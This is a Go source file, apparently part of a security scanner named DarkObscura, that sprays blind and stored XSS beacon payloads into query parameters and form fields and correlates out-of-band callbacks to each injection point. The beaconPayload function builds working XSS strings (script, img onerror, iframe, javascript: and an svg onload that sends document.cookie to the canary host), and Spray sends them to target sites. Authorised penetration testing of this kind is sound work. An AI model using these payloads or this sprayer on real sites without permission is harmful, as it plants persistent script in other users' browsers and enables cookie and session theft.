// Package blindxss finds stored and blind XSS — the class ordinary scanners miss
// because confirmation arrives on a different request, in a different user's
// browser, possibly days later. It sprays canary-bearing beacon payloads into
// storable inputs (query params, form fields, headers), records exactly which
// injection point each unique canary token came from, and later correlates any
// out-of-band callback (via the existing exploit.CanaryServer) back to its origin.
// A callback is absolute proof: the injected markup executed in a real browser
// and phoned home. Because each token is unique per injection point, correlation
// is exact and false-positive-free.
package blindxss

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/security-life-org/DarkObscura/internal/engine"
	"github.com/security-life-org/DarkObscura/internal/exploit"
)

// Origin records where a beacon token was planted.
type Origin struct {
	Token     string
	URL       string
	Param     string
	Location  string // "query" | "form" | "header"
	PlantedAt time.Time
}

// Registry maps canary tokens to their injection origin. Safe for concurrent use.
type Registry struct {
	mu      sync.Mutex
	origins map[string]Origin
}

// NewRegistry creates an empty registry.
func NewRegistry() *Registry { return &Registry{origins: make(map[string]Origin)} }

func (r *Registry) put(o Origin) {
	r.mu.Lock()
	r.origins[o.Token] = o
	r.mu.Unlock()
}

// Get returns the origin for a token.
func (r *Registry) Get(token string) (Origin, bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	o, ok := r.origins[token]
	return o, ok
}

// Tokens returns all planted tokens.
func (r *Registry) Tokens() []string {
	r.mu.Lock()
	defer r.mu.Unlock()
	out := make([]string, 0, len(r.origins))
	for t := range r.origins {
		out = append(out, t)
	}
	return out
}

// beaconPayload builds a single payload string bundling several execution
// contexts, all pointing at the same canary host so any one firing records the
// token. Kept on one token per injection point for exact correlation.
func beaconPayload(host string) string {
	u := "//" + host + "/b"
	variants := []string{
		fmt.Sprintf(`"><script src=%s></script>`, u),
		fmt.Sprintf(`<img src=x onerror="import('%s')">`, "https:"+u),
		fmt.Sprintf(`<svg onload="new Image().src='%s?c='+document.cookie">`, "https:"+u),
		fmt.Sprintf(`'><iframe src=%s>`, u),
		fmt.Sprintf(`javascript:import('%s')`, "https:"+u),
	}
	return strings.Join(variants, "")
}

// Target is an input to spray beacons into.
type Target struct {
	Method   string   // GET or POST
	URL      string
	Params   []string // query or form field names to inject
	Location string   // "query" | "form"
}

// Sprayer plants beacons using a session and a canary to mint tokens.
type Sprayer struct {
	Session *engine.Session
	Canary  *exploit.CanaryServer
	Reg     *Registry
}

// NewSprayer wires a sprayer. session and canary must be non-nil.
func NewSprayer(session *engine.Session, canary *exploit.CanaryServer, reg *Registry) *Sprayer {
	if reg == nil {
		reg = NewRegistry()
	}
	return &Sprayer{Session: session, Canary: canary, Reg: reg}
}

// Spray injects a uniquely-tokened beacon into every param of every target,
// registering each token's origin. It returns the number of beacons planted.
func (s *Sprayer) Spray(ctx context.Context, targets []Target) (int, error) {
	planted := 0
	for _, t := range targets {
		for _, p := range t.Params {
			token, host := s.Canary.NewToken()
			payload := beaconPayload(host)
			loc := t.Location
			if loc == "" {
				loc = "query"
			}
			if err := s.inject(ctx, t, p, payload, loc); err != nil {
				continue
			}
			s.Reg.put(Origin{Token: token, URL: t.URL, Param: p, Location: loc, PlantedAt: time.Now()})
			planted++
		}
	}
	return planted, nil
}

func (s *Sprayer) inject(ctx context.Context, t Target, param, payload, loc string) error {
	method := t.Method
	if method == "" {
		if loc == "form" {
			method = http.MethodPost
		} else {
			method = http.MethodGet
		}
	}
	var req *http.Request
	var err error
	switch loc {
	case "form":
		form := url.Values{param: {payload}}
		req, err = http.NewRequestWithContext(ctx, method, t.URL, strings.NewReader(form.Encode()))
		if err == nil {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}
	default: // query
		u, e := url.Parse(t.URL)
		if e != nil {
			return e
		}
		q := u.Query()
		q.Set(param, payload)
		u.RawQuery = q.Encode()
		req, err = http.NewRequestWithContext(ctx, method, u.String(), nil)
	}
	if err != nil {
		return err
	}
	resp, err := s.Session.Client.Do(req)
	if err != nil {
		return err
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	resp.Body.Close()
	s.Session.Observe(body)
	return nil
}

// Correlate polls the canary for callbacks and turns any triggered token into a
// confirmed stored/blind-XSS finding, tying the callback to its injection origin.
func Correlate(canary *exploit.CanaryServer, reg *Registry) []exploit.Finding {
	var out []exploit.Finding
	for _, token := range reg.Tokens() {
		triggered, hits := canary.Triggered(token)
		if !triggered {
			continue
		}
		o, _ := reg.Get(token)
		ev := []string{
			fmt.Sprintf("beacon planted at %s [%s:%s] on %s", o.URL, o.Location, o.Param, o.PlantedAt.Format(time.RFC3339)),
		}
		for _, h := range hits {
			ev = append(ev, fmt.Sprintf("%s callback from %s (%s) at %s",
				h.Protocol, h.Remote, h.Detail, h.At.Format(time.RFC3339)))
		}
		ev = append(ev, "verified: injected markup executed in a real browser and called back out-of-band — stored/blind XSS")
		out = append(out, exploit.Finding{
			Class: "stored-blind-xss", Severity: exploit.SevHigh,
			Target: o.URL, Param: o.Param, Confirmed: true,
			VerifiedVia: "out-of-band-beacon", Evidence: ev,
		})
	}
	return out
}

// Watch blocks, correlating callbacks every interval until ctx is cancelled or
// timeout elapses, invoking onFinding for each newly-confirmed origin exactly
// once. Useful for the "wait for the victim" window of a stored-XSS test.
func Watch(ctx context.Context, canary *exploit.CanaryServer, reg *Registry, interval, timeout time.Duration, onFinding func(exploit.Finding)) {
	deadline := time.Now().Add(timeout)
	reported := make(map[string]bool)
	tick := time.NewTicker(interval)
	defer tick.Stop()
	for {
		for _, f := range Correlate(canary, reg) {
			key := f.Target + "|" + f.Param
			if reported[key] {
				continue
			}
			reported[key] = true
			if onFinding != nil {
				onFinding(f)
			}
		}
		if time.Now().After(deadline) {
			return
		}
		select {
		case <-ctx.Done():
			return
		case <-tick.C:
		}
	}
}
